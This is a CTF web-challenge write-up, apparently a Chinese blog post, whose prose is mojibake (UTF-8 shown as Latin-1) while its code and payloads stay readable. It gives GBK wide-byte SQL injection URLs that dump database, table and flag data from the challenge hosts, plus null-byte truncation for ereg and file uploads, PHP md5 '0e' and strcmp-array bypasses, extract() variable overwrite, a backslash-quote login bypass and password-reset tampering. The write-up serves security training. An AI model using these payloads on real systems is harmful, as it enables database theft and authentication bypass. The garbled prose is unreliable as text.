<p>å‰ç«¯è¾“å…¥<code>%df%27</code>æ—¶é¦–å…ˆç»è¿‡ä¸Šé¢<code>addslashes</code>å‡½æ•°è½¬ä¹‰å˜æˆäº†<code>%df%5c%27</code>ï¼ˆ<code>%5cæ˜¯åæ–œæ \</code>)ï¼Œä¹‹ååœ¨æ•°æ®åº“æŸ¥è¯¢å‰å› ä¸ºè®¾ç½®äº†<code>GBK</code>ç¼–ç ï¼Œå³æ˜¯åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…ä¸¤ä¸ªå­—èŠ‚éƒ½ä¼šç»™é‡æ–°ç¼–ç ä¸ºä¸€ä¸ªæ±‰å­—ã€‚ç„¶åMySQLæœåŠ¡å™¨å°±ä¼šå¯¹æŸ¥è¯¢è¯­å¥è¿›è¡ŒGBKç¼–ç å³æ˜¯<code>%df%5c</code>è½¬æ¢æˆäº†æ±‰å­—<code>é‹</code>ï¼Œè€Œå•å¼•å·å°±é€ƒé€¸äº†å‡ºæ¥ï¼Œä»è€Œé€ æˆäº†æ³¨å…¥æ¼æ´ã€‚</p>
<p>ä»‹ç»å®Œäº†å®½å­—èŠ‚æ³¨å…¥çš„åŸç†ï¼Œæˆ‘ä»¬å†å›åˆ°è¿™é“é¢˜ç›®ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥æ¥è¿›è¡Œç»•è¿‡ï¼Œå½“æˆ‘ä»¬è¾“å…¥<code>%df'</code>ï¼Œå‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your sql:select id,title from news where id &#x3D; &#39;1é‹&#39;&#39;</span><br><span class="line"></span><br><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK&#x2F;index.php on line 10</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‘ç°å‡ºç°äº†æŠ¥é”™ï¼Œè¯´æ˜æˆ‘ä»¬çš„è¯­å¥å·²ç»å½±å“äº†æ­£å¸¸è¯­å¥çš„æ‰§è¡Œäº†ï¼Œå¯ä»¥å¼€å§‹æ³¨å…¥äº†ã€‚</p>
<p>é¦–å…ˆä½¿ç”¨<code>order by</code>åˆ¤æ–­åˆ—æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1%df%27%20order%20by%202--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‘ç°åªæœ‰ä¸¤åˆ—ï¼Œå†æŸ¥è¯¢å½“å‰æ•°æ®åº“åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,database()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>sae-chinalover</code>ï¼Œæ¥ç€æŸ¥è¯¢è¯¥æ•°æ®åº“ä¸­çš„è¡¨åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>ctf,ctf2,ctf3,ctf4,gbksqli,news</code>ï¼Œå†æŸ¥è¯¢åˆ—åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x63746634--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™é‡Œéœ€è¦æŠŠ<code>ctf4</code>è½¬æ¢ä¸ºåå…­è¿›åˆ¶</p>
</blockquote>
<p>å¾—åˆ°<code>id, flag</code>ï¼Œæœ€åæŸ¥è¯¢æ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,flag from ctf4--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<strong>flag: <code>nctf&#123;gbk_3sqli&#125; </code></strong></p>
<h4 id="x00">/x00</h4>
<h5 id="é¢˜å¹²-v9">é¢˜å¹²</h5>
<p>é¢˜ç›®æœ‰å¤šç§è§£æ³•ï¼Œä½ èƒ½æƒ³å‡ºæ¥å‡ ç§ï¼Ÿ</p>
<h5 id="é¢˜è§£-v8">é¢˜è§£</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;nctf&#x27;</span>])) &#123;</span><br><span class="line">       <span class="keyword">if</span> (@ereg (<span class="string">&quot;^[1-9]+$&quot;</span>, $_GET[<span class="string">&#x27;nctf&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#x27;</span>;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">&#x27;nctf&#x27;</span>], <span class="string">&#x27;#biubiubiu&#x27;</span>) !== <span class="literal">FALSE</span>)   </span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ ¹æ®ä¸Šé¢çš„æºç æç¤ºï¼Œè¦è¾“å…¥æ•°å­—å¹¶ä¸”å«æœ‰<code>#biubiubiu</code>å­—ç¬¦ä¸²çš„nctfå‚æ•°ã€‚</p>
<p>ç¬¬ä¸€ç§è§£æ³•ï¼š</p>
<p>ä½¿ç”¨<code>00æˆªæ–­</code>ç»•è¿‡<code>ereg</code>å‡½æ•°ï¼Œä½†è¦æ³¨æ„å°†<code>#</code>urlç¼–ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;teamxlc.sinaapp.com&#x2F;web4&#x2F;f5a14f5e6e3453b78cd73899bad98d53&#x2F;index.php?nctf&#x3D;1%00%23biubiubiu</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§è§£æ³•ï¼š</p>
<p>ç¬¬ä¸€ä¸ªä¸ç­‰å¼ä¸­<code>ereg</code>å‡½æ•°ï¼Œå½“ä¼ å…¥å‚æ•°ä¸ºæ•°ç»„<code>nctf[]</code>æ—¶ï¼Œ<code>NULL != FALSE</code> ï¼Œæ„é€ æˆåŠŸè·³è¿‡ç¬¬ä¸€ä¸ªä¸ç­‰å¼ï¼Œç¬¬äºŒä¸ªä¸ç­‰å¼ä¸­<code>strpos</code>å‡½æ•°ä¼ å…¥å‚æ•°æ•°ç»„ä¹‹å <code>NULL != FLASE</code>ä¼šè¿”å›flagã€‚</p>
<p>**flag:<code>nctf&#123;use_00_to_jieduan&#125;</code> **</p>
<h4 id="Bypass-again">Bypass again</h4>
<h5 id="é¢˜å¹²-v10">é¢˜å¹²</h5>
<p>ä¾æ—§æ˜¯å¼±ç±»å‹</p>
<p>æ¥æº hctf</p>
<h5 id="é¢˜è§£-v9">é¢˜è§£</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;a&#x27;</span>] != $_GET[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;a&#x27;</span>]) == md5($_GET[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸ç¬¬äºŒé“é¢˜md5 collisionç±»ä¼¼,ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸¤ä¸ªå­—ç¬¦ä¸²ç»è¿‡<code>md5</code>åŠ å¯†åï¼Œå‡ä»¥<code>0e</code>å¼€å¤´å³å¯ç»•è¿‡éªŒè¯ã€‚</p>
<p>Payloadï¼š<code>?a=QNKCDZO&amp;b=240610708</code></p>
<p><strong>Flag: <code>nctf&#123;php_is_so_cool&#125;</code></strong></p>
<h4 id="å˜é‡è¦†ç›–">å˜é‡è¦†ç›–</h4>
<h5 id="é¢˜å¹²-v11">é¢˜å¹²</h5>
<p>å¬è¯´è¿‡å˜é‡è¦†ç›–ä¹ˆï¼Ÿ</p>
<h5 id="é¢˜è§£-v10">é¢˜è§£</h5>
<p>æœ‰å…³å˜é‡è¦†ç›–çš„æ¼æ´åˆ©ç”¨åœ¨æˆ‘çš„å¦å¤–ä¸€ç¯‡åšæ–‡æœ‰è¯¦ç»†ä»‹ç»ï¼Œå¯ä»¥<a href="http://ca0y1h.top/categories/websecurity/custom/">ç§»æ­¥äºæ­¤</a>ã€‚</p>
<p>ç›´æ¥æŸ¥çœ‹source.phpæ–‡ä»¶çš„å…³é”®ä»£ç æ®µï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123; ?&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		extract($_POST);</span><br><span class="line">         if ($pass &#x3D;&#x3D; $thepassword_123) &#123; ?&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;alert alert-success&quot;&gt;</span><br><span class="line">                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;&#x2F;code&gt;</span><br><span class="line">             &lt;&#x2F;div&gt;</span><br><span class="line">         &lt;?php &#125; ?&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>postæ•°æ®ï¼š<code>pass=1&amp;thepassword_123=1</code></p>
<blockquote>
<p>æ³¨æ„ï¼šåœ¨é¡µé¢çš„è¾“å…¥è¡¨å•ä¸­è¾“å…¥payloadæ— æ•ˆ</p>
</blockquote>
<h4 id="ä¼ªè£…è€…">ä¼ªè£…è€…</h4>
<h5 id="é¢˜å¹²-v12">é¢˜å¹²</h5>
<p>è¿™æ˜¯ä¸€ä¸ªåˆ°å¤„éƒ½æœ‰ç€ä¼ªè£…çš„ä¸–ç•Œ</p>
<h5 id="é¢˜è§£-v11">é¢˜è§£</h5>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119092209.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬è¦æœ¬åœ°ç™»å½•ï¼Œåº”è¯¥å°±æ˜¯è¦æˆ‘ä»¬ç”¨ä¸€ä¸ªä¼ªé€ æœ¬åœ°IPåœ°å€è®¿é—®è¯¥é¡µé¢ã€‚BurpSuiteå¯¼å…¥ç¬¬ä¸‰æ–¹Pythonè„šæœ¬å¯ä»¥</p>
<p>å®ç°ä¼ªé€ IPçš„åŠŸèƒ½ã€‚</p>
<blockquote>
<p>é™„ä¸ŠPythonè„šæœ¬åœ°å€ï¼š<a href="https://github.com/TheKingOfDuck/burpFakeIP">burpFakeIP</a></p>
</blockquote>
<h4 id="ä¸Šä¼ ç»•è¿‡">ä¸Šä¼ ç»•è¿‡</h4>
<h5 id="é¢˜å¹²-v13">é¢˜å¹²</h5>
<p>çŒœçŒœä»£ç æ€ä¹ˆå†™çš„</p>
<h5 id="é¢˜è§£-v12">é¢˜è§£</h5>
<p>æ—¢ç„¶è¦çŒœä»£ç é€»è¾‘ï¼Œé‚£å°±å…ˆä¸€æ­¥ä¸€æ­¥çš„å°è¯•å’¯~</p>
<p>å¦‚æœä¸ä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œç›´æ¥submitï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119093359.png" alt=""></p>
<p>å¦‚æœä¸Šä¼ phpæ ¼å¼æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119093937.png" alt=""></p>
<p>å¦‚æœä¸Šä¼ jpgæ ¼å¼æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119093738.png" alt=""></p>
<p>å†ä½¿ç”¨BurpsuiteæŸ¥çœ‹è¯·æ±‚åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119094407.png" alt=""></p>
<p>å°è¯•åœ¨<code>/uploads/</code>åé¢åŠ ä¸Š<code>test.php+ç©ºæ ¼ </code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119094917.png" alt=""></p>
<p>ç„¶åå°†æ‰“å¼€HEXï¼Œå°†<code>test.php</code>åé¢ç©ºæ ¼<code>20</code>æ”¹ä¸º<code>00</code>ï¼Œæ„é€ <code>00</code>æˆªæ–­ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119094833.png" alt=""></p>
<p>å¾—åˆ°<strong>flag:nctf{welcome_to_hacks_world}</strong></p>
<h4 id="SQLæ³¨å…¥1">SQLæ³¨å…¥1</h4>
<h5 id="é¢˜å¹²-v14">é¢˜å¹²</h5>
<p>å¬è¯´ä½ ä¹Ÿä¼šæ³¨å…¥ï¼Ÿ</p>
<h5 id="é¢˜è§£-v13">é¢˜è§£</h5>
<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">&quot;select user from ctf where (user=&#x27;&quot;</span>.$user.<span class="string">&quot;&#x27;) and (pw=&#x27;&quot;</span>.$pass.<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¸¸è§„SQLæ³¨å…¥çš„é¢˜ç›®ï¼Œä½¿ç”¨adminç™»å½•ï¼Œé—­åˆ<code>')</code>ï¼Œæˆªæ–­pwåˆ¤æ–­ï¼š</p>
<p>payloadï¼š<code>user=admin')#&amp;pass=1</code></p>
<p>**flag:nctf{ni_ye_hui_sql?} **</p>
<h4 id="pass-check">pass check</h4>
<h5 id="é¢˜å¹²-v15">é¢˜å¹²</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pass=@$_POST[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//è¢«éšè—èµ·æ¥çš„å¯†ç </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag:nctf&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the pass is wrong!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;please input pass!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="é¢˜è§£ï¼š">é¢˜è§£ï¼š</h5>
<p><code>strcmp(array,string)==null==0</code>ï¼Œæ‰€ä»¥POSTä¸€ä¸ªæ•°ç»„å¯¹è±¡å³å¯ã€‚</p>
<p>payload: <code>pass[]=qaz</code></p>
<p><strong>flag:nctf{strcmp_is_n0t_3afe}</strong></p>
<h4 id="èµ·åå­—çœŸéš¾">èµ·åå­—çœŸéš¾</h4>
<h5 id="é¢˜å¹²-v16">é¢˜å¹²</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">       $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">&#x27;*******&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="é¢˜è§£-v14">é¢˜è§£</h5>
<p>ä¸èƒ½å‡ºç°<code>1-9</code>ä¹‹é—´çš„æ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½å°è¯•å°†<code>54975581388</code>è½¬æˆ16è¿›åˆ¶</p>
<p>è½¬æ¢åçš„ç»“æœæ˜¯<code>ccccccccc</code>ï¼Œå¯ä»¥ä½¿ç”¨</p>
<p>payloadï¼š<code>?key=0xccccccccc</code></p>
<p>å¾—åˆ°<code>The flag is:nctf&#123;follow_your_dream&#125;</code></p>
<h4 id="å¯†ç é‡ç½®">å¯†ç é‡ç½®</h4>
<h5 id="é¢˜å¹²-v17">é¢˜å¹²</h5>
<p>é‡ç½®ç®¡ç†å‘˜è´¦å·ï¼šadmin çš„å¯†ç </p>
<p>ä½ åœ¨ç‚¹å‡»å¿˜è®°å¯†ç ä¹‹å ä½ çš„é‚®ç®±æ”¶åˆ°äº†ä¸€å°é‡ç½®å¯†ç çš„é‚®ä»¶</p>
<h5 id="é¢˜è§£-v15">é¢˜è§£</h5>
<p>è§‚å¯Ÿé¡µé¢å¯ä»¥å‘ç°åœ°å€æ çš„å‚æ•°ç»è¿‡äº†Base64ç¼–ç å¤„ç†ï¼Œè§£ç å¾—åˆ°<code>ctfuser</code>ã€‚å¦‚æœè¦é‡ç½®adminçš„å¯†ç ï¼Œæˆ‘ä»¬æŠ“ä¸ªåŒ…å°†åœ°å€æ å‚æ•°å’ŒPOSTæ•°æ®ä¿®æ”¹ä¸€ä¸‹å³å¯ï¼š</p>
<p><code>?user1=%59%57%52%74%61%57%34%3d</code></p>
<p><code>user=admin&amp;newpass=1&amp;vcode=1234</code></p>
<p><strong>flag is:nctf{reset_password_often_have_vuln}</strong></p>
<h4 id="SQL-Injection">SQL Injection</h4>
<h5 id="é¢˜å¹²-v18">é¢˜å¹²</h5>
<p>ç»§ç»­æ³¨å…¥å§ï¼ TIP:åæ–œæ å¯ä»¥ç”¨æ¥è½¬ä¹‰ ä»”ç»†æŸ¥çœ‹ç›¸å…³å‡½æ•°çš„ç”¨æ³•</p>
<h5 id="é¢˜è§£-v16">é¢˜è§£</h5>
<p>ç”¨F12æŸ¥çœ‹æºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">$password = @clean((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;</span>.$username.<span class="string">&#x27;\&#x27; AND pass=\&#x27;&#x27;</span>.$password.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid password!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sqlè¯­å¥ï¼š<code>SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';</code></p>
<p>è§‚å¯Ÿcleanå‡½æ•°ä¸­çš„è¿”å›å€¼ç»è¿‡htmlentities()å‡½æ•°è¿‡æ»¤ï¼Œè¿™ä¸ªå­—ç¬¦å°†å­—ç¬¦è½¬æ¢ä¸º HTML è½¬ä¹‰å­—ç¬¦ ï¼Œç¬¬äºŒä¸ªå‚æ•°å¦‚æœæ²¡æœ‰é»˜è®¤åªè½¬æ¢åŒå¼•å·ï¼Œä½†å‚æ•°å€¼ä¸ºENT_QUOTESæ—¶æ—¢è½¬æ¢åŒå¼•å·åˆè½¬æ¢å•å¼•å·ã€‚</p>
<p>æˆ‘ä»¬æœ€ç»ˆç›®æ ‡æ˜¯å¹³è¡¡å•å¼•å·ï¼Œå¯æ˜¯ç»è¿‡è¿™ä¸ªå‡½æ•°è¿‡æ»¤æˆ‘ä»¬æ— æ³•è¾“å…¥å•å¼•å·ï¼Œåªèƒ½æƒ³æ€ä¹ˆæ¶ˆç­åŸæ¥çš„å•å¼•å·ã€‚</p>
<p>æ„é€ payloadï¼š<code>?username=\&amp;password= or 1=1#</code>ä½¿å¾—æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE name&#x3D;&#39;\&#39; AND pass&#x3D;&#39; or 1%23&#39;</span><br><span class="line">å³</span><br><span class="line">SELECT * FROM users WHERE </span><br><span class="line">name&#x3D;&#39;\&#39; AND pass&#x3D;&#39;            ã€ [name]çš„å€¼ä¸º [&#39; AND pass&#x3D;]ï¼Œå•å¼•å·è¢«è½¬ä¹‰äº†ï¼Œæ˜¾ç„¶é€»è¾‘å€¼ä¸ºfalse ã€</span><br><span class="line">or 1&#x3D;1                         ã€ ä½†æ²¡å…³ç³»ï¼Œ[false or 1] çš„é€»è¾‘å€¼ä¸ºçœŸ ã€ </span><br><span class="line">%23&#39;                           ã€ %23æ˜¯#çš„urlç¼–ç ï¼Œæ³¨é‡Šæ‰å¤šä½™çš„å•å¼•å· ã€</span><br><span class="line">å³</span><br><span class="line">select * from users where false or 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>**flag:nctf{sql_injection_is_interesting} **</p>
<h4 id="ç»¼åˆé¢˜">ç»¼åˆé¢˜</h4>
<p>æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸²çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œgoogleä¸€ä¸‹æ˜¯jsfuckç¼–ç ï¼Œ<a href="http://www.bugku.com/tools/jsfuck/">åœ¨çº¿è§£ç ç½‘ç«™</a>ï¼Œç›´æ¥æ‹–åˆ°æ§åˆ¶å°ç•Œé¢æ‰§è¡Œå¾—åˆ° 1bc29b36f623ba82aaf6724fd3b16718.phpã€‚</p>
<p>æ¥ç€æ‰“å¼€è¿™ä¸ªç½‘ç«™å¾—åˆ°æç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119161243.png" alt=""></p>
<p>æ ¹æ®æç¤ºæŸ¥çœ‹httpå¤´ä¿¡æ¯ï¼š<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119161306.png" alt=""></p>
<p>history of bashæç¤ºæˆ‘ä»¬åœ¨Linuxç³»ç»Ÿä¸­æœ‰ä¸€ä¸ª<code>.history_bash</code>æ–‡ä»¶æ¥è®°å½•æœ€è¿‘è‹¥å¹²æ¡bashå‘½ä»¤ã€‚ æ‰€ä»¥å°è¯•æ‰“å¼€è¯¥ç›®å½•ä¸‹è¿™ä¸ªæ–‡ä»¶ urlï¼š<code>http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history </code>ï¼Œå¾—åˆ°æ–°çš„æç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119163814.png" alt=""></p>
<p>åœ¨å½“å‰ç›®å½•ä¸‹è®¿é—®<code>http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</code>å¾—åˆ°**flag: nctf{bash_history_means_what} **</p>
<h4 id="SQLæ³¨å…¥2">SQLæ³¨å…¥2</h4>
<h5 id="é¢˜å¹²-v19">é¢˜å¹²</h5>
<p>æ³¨å…¥ç¬¬äºŒé¢˜~~ä¸»è¦è€ƒå¯ŸunionæŸ¥è¯¢</p>
<h5 id="é¢˜è§£-v17">é¢˜è§£</h5>
<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">  mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">&quot;select pw from ctf where user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
